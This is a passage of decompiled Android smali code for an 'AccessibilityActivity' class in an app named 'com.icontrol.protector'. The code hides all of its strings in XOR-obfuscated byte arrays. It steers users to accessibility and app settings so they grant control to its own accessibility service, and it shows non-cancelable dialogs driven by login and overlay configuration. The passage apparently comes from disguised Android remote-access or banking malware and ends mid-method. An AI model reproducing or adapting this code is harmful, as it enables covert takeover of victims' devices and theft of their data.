.class public Lcom/icontrol/protector/AccessibilityActivity;
.super Landroid/app/Activity;
.source "SourceFile"


# static fields
.field static c:Landroid/content/Context;


# instance fields
.field private b:Landroid/app/AlertDialog;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static synthetic a(Lcom/icontrol/protector/AccessibilityActivity;Landroid/content/DialogInterface;I)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/AccessibilityActivity;->j(Landroid/content/DialogInterface;I)V

    return-void
.end method

.method public static synthetic b(Lcom/icontrol/protector/AccessibilityActivity;Landroid/content/DialogInterface;I)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/AccessibilityActivity;->h(Landroid/content/DialogInterface;I)V

    return-void
.end method

.method public static synthetic c(Lcom/icontrol/protector/AccessibilityActivity;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/icontrol/protector/AccessibilityActivity;->k(Ljava/lang/String;)V

    return-void
.end method

.method public static synthetic d(Lcom/icontrol/protector/AccessibilityActivity;Landroid/content/DialogInterface;I)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/AccessibilityActivity;->i(Landroid/content/DialogInterface;I)V

    return-void
.end method

.method private e(F)F
    .locals 1

    .line 1
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v0, v0, Landroid/util/DisplayMetrics;->density:F

    mul-float/2addr p1, v0

    return p1
.end method

.method private f()V
    .locals 7

    .line 1
    new-instance v0, Landroid/content/Intent;

    const/16 v1, 0x2b

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v1, 0x70800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v3

    const-class v4, Lcom/icontrol/protector/AccessServices;

    if-nez v3, :cond_0

    new-instance v0, Landroid/content/Intent;

    const/16 v3, 0x27

    new-array v5, v3, [B

    fill-array-data v5, :array_2

    new-array v6, v2, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v0, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v5

    if-nez v5, :cond_0

    new-instance v0, Landroid/content/Intent;

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    new-array v5, v2, [B

    fill-array-data v5, :array_5

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/16 v3, 0x23

    new-array v3, v3, [B

    fill-array-data v3, :array_6

    new-array v2, v2, [B

    fill-array-data v2, :array_7

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Landroid/content/ComponentName;

    sget-object v5, Lcom/icontrol/protector/AccessibilityActivity;->c:Landroid/content/Context;

    invoke-direct {v3, v5, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    :goto_0
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void

    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v3, 0x1

    new-array v3, v3, [B

    const/4 v5, 0x0

    const/16 v6, 0x5a

    aput-byte v6, v3, v5

    new-array v5, v2, [B

    fill-array-data v5, :array_8

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v3, Landroid/os/Bundle;

    invoke-direct {v3}, Landroid/os/Bundle;-><init>()V

    const/16 v4, 0x1b

    new-array v5, v4, [B

    fill-array-data v5, :array_9

    new-array v6, v2, [B

    fill-array-data v6, :array_a

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5, v1}, Landroid/os/BaseBundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    new-array v4, v4, [B

    fill-array-data v4, :array_b

    new-array v5, v2, [B

    fill-array-data v5, :array_c

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/16 v1, 0x1c

    new-array v1, v1, [B

    fill-array-data v1, :array_d

    new-array v2, v2, [B

    fill-array-data v2, :array_e

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Bundle;)Landroid/content/Intent;

    goto :goto_0

    nop

    :array_0
    .array-data 1
        -0x58t
        0x4bt
        0x70t
        0x1ft
        0x59t
        -0x1t
        -0x77t
        -0x32t
        -0x42t
        0x4at
        0x7at
        0x1ft
        0x4bt
        -0x3t
        -0x79t
        -0x28t
        -0x48t
        0x57t
        0x74t
        0x53t
        0x43t
        -0xet
        -0x73t
        -0x37t
        -0x4et
        0xat
        0x74t
        0x5ft
        0x59t
        -0x16t
        -0x7bt
        -0x2ft
        -0x59t
        0x41t
        0x79t
        0x6et
        0x59t
        -0x5t
        -0x6at
        -0x35t
        -0x5et
        0x47t
        0x78t
    .end array-data

    :array_1
    .array-data 1
        -0x35t
        0x24t
        0x1dt
        0x31t
        0x2at
        -0x62t
        -0x1ct
        -0x43t
    .end array-data

    :array_2
    .array-data 1
        0x4t
        0x68t
        0x47t
        -0x4ct
        -0x6ct
        0x7dt
        -0x1at
        0x57t
        0x16t
        0x63t
        0x57t
        -0x4et
        -0x6et
        0x7at
        -0x1bt
        0xat
        0x4bt
        0x47t
        0x60t
        -0x7bt
        -0x42t
        0x47t
        -0x2ft
        0x30t
        0x27t
        0x4ft
        0x6ft
        -0x71t
        -0x51t
        0x4dt
        -0x23t
        0x2at
        0x20t
        0x52t
        0x77t
        -0x71t
        -0x4bt
        0x53t
        -0x2ft
    .end array-data

    :array_3
    .array-data 1
        0x65t
        0x6t
        0x23t
        -0x3at
        -0x5t
        0x14t
        -0x7et
        0x79t
    .end array-data

    :array_4
    .array-data 1
        -0x17t
        0xft
        -0x80t
        -0x15t
        -0x64t
        -0x70t
        0x1ct
        0x1ft
        -0x5t
        0x4t
        -0x70t
        -0x13t
        -0x66t
        -0x69t
        0x1ft
        0x42t
        -0x5at
        0x20t
        -0x59t
        -0x26t
        -0x4at
        -0x56t
        0x2bt
        0x78t
        -0x36t
        0x28t
        -0x58t
        -0x30t
        -0x59t
        -0x60t
        0x27t
        0x62t
        -0x33t
        0x35t
        -0x50t
        -0x30t
        -0x43t
        -0x42t
        0x2bt
    .end array-data

    :array_5
    .array-data 1
        -0x78t
        0x61t
        -0x1ct
        -0x67t
        -0xdt
        -0x7t
        0x78t
        0x31t
    .end array-data

    :array_6
    .array-data 1
        0x75t
        -0x3bt
        -0x1et
        -0x42t
        0x50t
        0x12t
        0x74t
        -0x78t
        0x7dt
        -0x3bt
        -0xet
        -0x57t
        0x51t
        0xft
        0x3et
        -0x3dt
        0x6ct
        -0x21t
        -0xct
        -0x53t
        0x11t
        0x38t
        0x5ft
        -0x15t
        0x44t
        -0x1ct
        -0x38t
        -0x77t
        0x71t
        0x2ft
        0x4ft
        -0x18t
        0x55t
        -0x1at
        -0x3dt
    .end array-data

    :array_7
    .array-data 1
        0x14t
        -0x55t
        -0x7at
        -0x34t
        0x3ft
        0x7bt
        0x10t
        -0x5at
    .end array-data

    :array_8
    .array-data 1
        0x75t
        -0x2at
        -0x42t
        0x63t
        -0x7dt
        0x26t
        0x4et
        0x3ct
    .end array-data

    :array_9
    .array-data 1
        -0x80t
        0x3et
        -0x75t
        0x47t
        -0x4ft
        0x65t
        0x4t
        -0x35t
        -0x37t
        0x77t
        -0x78t
        0x41t
        -0x5ct
        0x6bt
        0x7t
        -0x37t
        -0x2ct
        0x39t
        -0x4ft
        0x52t
        -0x49t
        0x6bt
        0x19t
        -0xdt
        -0x2ft
        0x28t
        -0x69t
    .end array-data

    :array_a
    .array-data 1
        -0x46t
        0x4dt
        -0x12t
        0x33t
        -0x3bt
        0xct
        0x6at
        -0x54t
    .end array-data

    :array_b
    .array-data 1
        -0x12t
        0x6at
        0x4dt
        0x2et
        -0x70t
        -0x1at
        0x27t
        -0x54t
        -0x59t
        0x23t
        0x4et
        0x28t
        -0x7bt
        -0x18t
        0x24t
        -0x52t
        -0x46t
        0x6dt
        0x77t
        0x3bt
        -0x6at
        -0x18t
        0x3at
        -0x6ct
        -0x41t
        0x7ct
        0x51t
    .end array-data

    :array_c
    .array-data 1
        -0x2ct
        0x19t
        0x28t
        0x5at
        -0x1ct
        -0x71t
        0x49t
        -0x35t
    .end array-data

    :array_d
    .array-data 1
        0x53t
        0x22t
        0x1t
        -0x25t
        -0x30t
        0x75t
        -0x7et
        0x4t
        0x1at
        0x6bt
        0x17t
        -0x39t
        -0x35t
        0x6bt
        -0x4dt
        0x5t
        0x1bt
        0x30t
        0x3t
        -0x3et
        -0x3ft
        0x72t
        -0x68t
        0x3ct
        0x8t
        0x23t
        0x3t
        -0x24t
    .end array-data

    :array_e
    .array-data 1
        0x69t
        0x51t
        0x64t
        -0x51t
        -0x5ct
        0x1ct
        -0x14t
        0x63t
    .end array-data
.end method

.method private g()V
    .locals 5

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x2

    const/high16 v2, 0x10000000

    const/16 v3, 0x8

    if-ne v0, v1, :cond_0

    new-instance v0, Landroid/content/Intent;

    const/16 v1, 0x2d

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v1, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/4 v1, 0x7

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v3, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-static {v1, v3, v4}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    :goto_0
    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_1

    :cond_0
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const/16 v1, 0x25

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v3, v3, [B

    fill-array-data v3, :array_5

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    goto :goto_0

    :goto_1
    return-void

    :array_0
    .array-data 1
        0x33t
        -0x33t
        0x30t
        -0x71t
        -0x27t
        0x18t
        -0x51t
        0xat
        0x21t
        -0x3at
        0x20t
        -0x77t
        -0x21t
        0x1ft
        -0x54t
        0x57t
        0x7ct
        -0x1et
        0x4t
        -0x53t
        -0x6t
        0x38t
        -0x78t
        0x65t
        0x6t
        -0x16t
        0x1bt
        -0x4dt
        -0x17t
        0x35t
        -0x72t
        0x70t
        0x13t
        -0x16t
        0x18t
        -0x52t
        -0x17t
        0x22t
        -0x72t
        0x70t
        0x6t
        -0x16t
        0x1at
        -0x46t
        -0x1bt
    .end array-data

    nop

    :array_1
    .array-data 1
        0x52t
        -0x5dt
        0x54t
        -0x3t
        -0x4at
        0x71t
        -0x35t
        0x24t
    .end array-data

    :array_2
    .array-data 1
        -0x51t
        -0x22t
        0x5dt
        0x25t
        -0x59t
        -0x3bt
        -0x77t
    .end array-data

    :array_3
    .array-data 1
        -0x21t
        -0x41t
        0x3et
        0x4et
        -0x3at
        -0x5et
        -0x14t
        -0x57t
    .end array-data

    :array_4
    .array-data 1
        0x2dt
        0x4ft
        -0x18t
        -0x43t
        -0x63t
        -0x6at
        -0x35t
        -0x3t
        0x3ft
        0x44t
        -0x8t
        -0x45t
        -0x65t
        -0x6ft
        -0x38t
        -0x60t
        0x62t
        0x60t
        -0x24t
        -0x61t
        -0x42t
        -0x4at
        -0x14t
        -0x6et
        0x18t
        0x68t
        -0x3dt
        -0x7ft
        -0x53t
        -0x54t
        -0x16t
        -0x79t
        0x18t
        0x68t
        -0x3et
        -0x78t
        -0x5ft
    .end array-data

    nop

    :array_5
    .array-data 1
        0x4ct
        0x21t
        -0x74t
        -0x31t
        -0xet
        -0x1t
        -0x51t
        -0x2dt
    .end array-data
.end method

.method private synthetic h(Landroid/content/DialogInterface;I)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/icontrol/protector/AccessibilityActivity;->f()V

    return-void
.end method

.method private synthetic i(Landroid/content/DialogInterface;I)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/icontrol/protector/AccessibilityActivity;->g()V

    return-void
.end method

.method private synthetic j(Landroid/content/DialogInterface;I)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/icontrol/protector/AccessibilityActivity;->f()V

    return-void
.end method

.method private synthetic k(Ljava/lang/String;)V
    .locals 6

    .line 1
    sget-object v0, Lcom/icontrol/protector/My_Configs;->_Login_lng_:Ljava/lang/String;

    const/16 v1, 0x8

    if-eqz v0, :cond_0

    const/4 v2, 0x4

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    new-array v3, v1, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const-string v3, "\r\n\r\n"

    invoke-virtual {v0, v2, v3}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :cond_0
    sget-object v2, Lcom/icontrol/protector/My_Configs;->Draws_overs:Ljava/lang/String;

    const/4 v3, 0x1

    new-array v3, v3, [B

    const/16 v4, 0x61

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    new-array v4, v1, [B

    fill-array-data v4, :array_2

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const-string v3, "\r\n"

    if-eqz v2, :cond_1

    new-instance v2, Landroid/app/AlertDialog$Builder;

    invoke-direct {v2, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    sget v4, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a30;->f:I

    invoke-virtual {v2, v4}, Landroid/app/AlertDialog$Builder;->setIcon(I)Landroid/app/AlertDialog$Builder;

    move-result-object v2

    invoke-virtual {v2, p1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    sget-object v0, Lcom/icontrol/protector/My_Configs;->_Login_btn_:Ljava/lang/String;

    new-instance v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h0;

    invoke-direct {v2, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h0;-><init>(Lcom/icontrol/protector/AccessibilityActivity;)V

    invoke-virtual {p1, v0, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    sget-object v0, Lcom/icontrol/protector/My_Configs;->_Login_dis_:Ljava/lang/String;

    new-instance v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/i0;

    invoke-direct {v2, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/i0;-><init>(Lcom/icontrol/protector/AccessibilityActivity;)V

    invoke-virtual {p1, v0, v2}, Landroid/app/AlertDialog$Builder;->setNeutralButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    :goto_0
    invoke-virtual {p1, v5}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    invoke-virtual {p1}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object p1

    iput-object p1, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    goto :goto_1

    :cond_1
    new-instance v2, Landroid/app/AlertDialog$Builder;

    invoke-direct {v2, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    sget v4, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a30;->f:I

    invoke-virtual {v2, v4}, Landroid/app/AlertDialog$Builder;->setIcon(I)Landroid/app/AlertDialog$Builder;

    move-result-object v2

    invoke-virtual {v2, p1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    sget-object v0, Lcom/icontrol/protector/My_Configs;->_Login_btn_:Ljava/lang/String;

    new-instance v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j0;

    invoke-direct {v2, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j0;-><init>(Lcom/icontrol/protector/AccessibilityActivity;)V

    invoke-virtual {p1, v0, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    goto :goto_0

    :goto_1
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result p1

    if-nez p1, :cond_6

    invoke-virtual {p0}, Landroid/app/Activity;->isDestroyed()Z

    move-result p1

    if-nez p1, :cond_6

    iget-object p1, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    invoke-virtual {p1}, Landroid/app/Dialog;->show()V

    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    const/16 v0, 0xa

    new-array v0, v0, [B

    fill-array-data v0, :array_3

    new-array v2, v1, [B

    fill-array-data v2, :array_4

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x2

    new-array v2, v2, [B

    fill-array-data v2, :array_5

    new-array v3, v1, [B

    fill-array-data v3, :array_6

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x7

    new-array v4, v3, [B

    fill-array-data v4, :array_7

    new-array v5, v1, [B

    fill-array-data v5, :array_8

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v0, v2, v4}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result p1

    iget-object v0, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    invoke-virtual {v0, p1}, Landroid/app/Dialog;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    const/high16 v0, -0x1000000

    if-eqz p1, :cond_2

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setTextColor(I)V

    :cond_2
    iget-object p1, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    const v2, 0x102000b

    invoke-virtual {p1, v2}, Landroid/app/Dialog;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    if-eqz p1, :cond_3

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setTextColor(I)V

    :cond_3
    new-instance p1, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {p1}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    const/4 v0, -0x1

    invoke-virtual {p1, v0}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    const/high16 v2, 0x41800000    # 16.0f

    invoke-direct {p0, v2}, Lcom/icontrol/protector/AccessibilityActivity;->e(F)F

    move-result v2

    invoke-virtual {p1, v2}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    iget-object v2, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    invoke-virtual {v2}, Landroid/app/Dialog;->getWindow()Landroid/view/Window;

    move-result-object v2

    invoke-virtual {v2, p1}, Landroid/view/Window;->setBackgroundDrawable(Landroid/graphics/drawable/Drawable;)V

    iget-object p1, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    invoke-virtual {p1}, Landroid/app/Dialog;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/4 v2, 0x0

    invoke-virtual {p1, v2}, Landroid/view/Window;->setDimAmount(F)V

    iget-object p1, p0, Lcom/icontrol/protector/AccessibilityActivity;->b:Landroid/app/AlertDialog;

    invoke-virtual {p1}, Landroid/app/Dialog;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-virtual {p1, v2}, Landroid/view/Window;->setDimAmount(F)V

    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    new-array v2, v3, [B

    fill-array-data v2, :array_9

    new-array v4, v1, [B

    fill-array-data v4, :array_a

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v1, [B

    fill-array-data v4, :array_b

    new-array v5, v1, [B

    fill-array-data v5, :array_c

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

